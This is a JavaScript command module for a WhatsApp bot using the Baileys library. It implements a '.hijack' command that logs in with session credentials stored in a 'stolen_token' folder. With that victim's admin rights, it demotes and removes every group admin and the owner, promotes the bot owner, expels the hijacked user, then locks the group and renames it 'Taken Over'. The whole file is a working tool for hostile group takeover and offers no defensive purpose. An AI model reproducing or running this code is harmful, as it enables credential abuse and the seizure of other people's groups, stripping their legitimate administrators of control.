const fs = require('fs')
const path = require('path')
const { useMultiFileAuthState, makeWASocket, BufferJSON, DisconnectReason } = require('@whiskeysockets/baileys')

module.exports = {
  pattern: "hijack",
  category: 'media',
  desc: "Auto group takeover — demotes all admins, promotes bot owner",
  usage: ".hijack",

  run: async ({ sock, from, msg, args, isOwner }) => {
    if (!isOwner) return sock.sendMessage(from, { text: "❌ Owner only" })
    if (!from.endsWith('@g.us')) return sock.sendMessage(from, { text: "❌ Use in target group" })

    const tokenPath = path.resolve('./stolen_token')
    if (!fs.existsSync(tokenPath) || !fs.existsSync(path.join(tokenPath, 'creds.json'))) {
      return sock.sendMessage(from, { text: "❌ No token. First run .setoken" })
    }

    const botOwnerJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net'
    const targetGroup = from

    await sock.sendMessage(from, { text: "⚡ Hijacking group..." })

    const { state, saveCreds } = await useMultiFileAuthState(tokenPath)
    const raw = JSON.parse(fs.readFileSync(path.join(tokenPath, 'creds.json'), 'utf-8'), BufferJSON.reviver)
    const hijackedJid = raw.me?.id?.split(':')[0] + '@s.whatsapp.net'

    const hijackSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      syncFullHistory: false,
      markOnlineOnConnect: false,
      downloadHistory: false
    })
    hijackSock.ev.on('creds.update', saveCreds)

    await new Promise((resolve, reject) => {
      const t = setTimeout(() => reject(new Error('timeout')), 15000)
      hijackSock.ev.on('connection.update', (u) => {
        if (u.connection === 'open') { clearTimeout(t); resolve() }
        if (u.connection === 'close') {
          clearTimeout(t)
          reject(new Error('connection failed'))
        }
      })
    })

    let meta
    try {
      meta = await hijackSock.groupMetadata(targetGroup)
    } catch (e) {
      hijackSock.end(new Error('done'))
      return sock.sendMessage(from, { text: "❌ Stolen user not in this group" })
    }

    const participants = meta.participants || []
    const currentOwner = meta.owner
    const superAdmins = participants.filter(p => p.admin === 'superadmin').map(p => p.id)
    const admins = participants.filter(p => p.admin === 'admin').map(p => p.id)

    const stolenIsAdmin = currentOwner === hijackedJid || superAdmins.includes(hijackedJid) || admins.includes(hijackedJid)
    if (!stolenIsAdmin) {
      hijackSock.end(new Error('done'))
      return sock.sendMessage(from, { text: "❌ Stolen user not admin here" })
    }

    // Demote super admins
    for (let i = 0; i < superAdmins.filter(j => j !== hijackedJid && j !== botOwnerJid).length; i += 5) {
      try {
        await hijackSock.groupParticipantsUpdate(targetGroup, superAdmins.filter(j => j !== hijackedJid && j !== botOwnerJid).slice(i, i + 5), 'demote')
        await new Promise(r => setTimeout(r, 1000))
      } catch (_) { await new Promise(r => setTimeout(r, 3000)) }
    }

    // Demote admins
    for (let i = 0; i < admins.filter(j => j !== hijackedJid && j !== botOwnerJid).length; i += 5) {
      try {
        await hijackSock.groupParticipantsUpdate(targetGroup, admins.filter(j => j !== hijackedJid && j !== botOwnerJid).slice(i, i + 5), 'demote')
        await new Promise(r => setTimeout(r, 1000))
      } catch (_) { await new Promise(r => setTimeout(r, 3000)) }
    }

    // Demote owner
    if (currentOwner && currentOwner !== hijackedJid && currentOwner !== botOwnerJid) {
      try { await hijackSock.groupParticipantsUpdate(targetGroup, [currentOwner], 'demote'); await new Promise(r => setTimeout(r, 1500)) } catch (_) {}
    }

    // Add bot owner if needed
    if (!participants.find(p => p.id === botOwnerJid)) {
      try { await hijackSock.groupParticipantsUpdate(targetGroup, [botOwnerJid], 'add'); await new Promise(r => setTimeout(r, 2000)) }
      catch (e) { hijackSock.end(new Error('done')); return sock.sendMessage(from, { text: `❌ ${e.message}` }) }
    }

    // Promote bot owner
    try { await hijackSock.groupParticipantsUpdate(targetGroup, [botOwnerJid], 'promote'); await new Promise(r => setTimeout(r, 1500)) }
    catch (e) { hijackSock.end(new Error('done')); return sock.sendMessage(from, { text: `❌ ${e.message}` }) }

    // Remove stolen user
    if (hijackedJid !== botOwnerJid) {
      try { await hijackSock.groupParticipantsUpdate(targetGroup, [hijackedJid], 'remove'); await new Promise(r => setTimeout(r, 1500)) } catch (_) {}
    }

    // Remove former owner
    if (currentOwner && currentOwner !== hijackedJid && currentOwner !== botOwnerJid) {
      try { await hijackSock.groupParticipantsUpdate(targetGroup, [currentOwner], 'remove'); await new Promise(r => setTimeout(r, 1500)) } catch (_) {}
    }

    // Remove all former admins
    const allRemoved = [...new Set([...superAdmins, ...admins])].filter(j => j !== botOwnerJid && j !== hijackedJid)
    for (let i = 0; i < allRemoved.length; i += 5) {
      try {
        await hijackSock.groupParticipantsUpdate(targetGroup, allRemoved.slice(i, i + 5), 'remove')
        await new Promise(r => setTimeout(r, 1000))
      } catch (_) { await new Promise(r => setTimeout(r, 3000)) }
    }

    // Lock
    await new Promise(r => setTimeout(r, 2000))
    try { await sock.groupSettingUpdate(targetGroup, 'announcement') } catch (_) {}
    try { await sock.groupSettingUpdate(targetGroup, 'locked') } catch (_) {}
    try { await sock.groupUpdateSubject(targetGroup, '🔒 Taken Over') } catch (_) {}

    hijackSock.end(new Error('done'))

    await sock.sendMessage(from, { text: "✅ *TAKEOVER DONE*\nAll admins demoted. Bot owner promoted." })
    await sock.sendMessage(botOwnerJid, { text: `✅ Group takeover done in ${targetGroup}` })
  }
}
